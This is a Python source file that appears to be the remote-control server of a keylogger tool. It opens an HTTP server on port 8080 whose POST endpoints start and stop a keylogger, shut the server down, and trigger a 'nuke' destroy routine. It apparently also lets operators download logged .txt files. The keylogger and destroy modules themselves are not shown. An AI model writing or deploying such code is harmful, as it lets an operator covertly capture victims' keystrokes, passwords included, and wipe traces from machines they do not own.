from http.server import HTTPServer, SimpleHTTPRequestHandler
import time, threading
import client.keylogger as keylogger, globals, nuke

class CustomHTTPReqHandler(SimpleHTTPRequestHandler):
    def end_headers(self):
        if self.path.endswith('.txt'):
            self.send_header('Content-Disposition', 'attachment')
        SimpleHTTPRequestHandler.end_headers(self)

    def do_POST(self):
        if self.path == '/start_logger':

            # print("hello")
            keylogger.start_keylogger()
            self.send_response(200)
            self.send_header('Content-type', 'text/html')
            self.end_headers()
            self.wfile.write(bytes("Logger Start Sucessfull\n", "utf8"))
        elif self.path == '/stop_logger':
            keylogger.stop_keylogger()
            self.send_response(200)
            self.send_header('Content-type', 'text/html')
            self.end_headers()
            self.wfile.write(bytes("Logger Stop Sucessfull\n", "utf8"))
        elif self.path == '/stop_server':
            globals.status['status'] = False
            self.send_response(200)
            self.send_header('Content-type', 'text/html')
            self.end_headers()
            self.wfile.write(bytes("Server Stop Sucessfull\n", "utf8"))
        elif self.path == '/nuke':
            nuke.destroy()
            self.send_response(200)
            self.send_header('Content-type', 'text/html')
            self.end_headers()
            self.wfile.write(bytes("Nuke Launched\n", "utf8")) 
        else:
            self.send_error(404, "unknown function")

def run(server_class=HTTPServer, handler_class=CustomHTTPReqHandler): 
    server_address = ('', 8080)
    httpd = server_class(server_address, handler_class)
    print('running on port 8080')
    
    #start server in new thread
    server_thread = threading.Thread(target = httpd.serve_forever)
    server_thread.daemon = True
    server_thread.start()

    while globals.status['status']:
        time.sleep(1)
    
    httpd.shutdown()
    print('Server stpped')


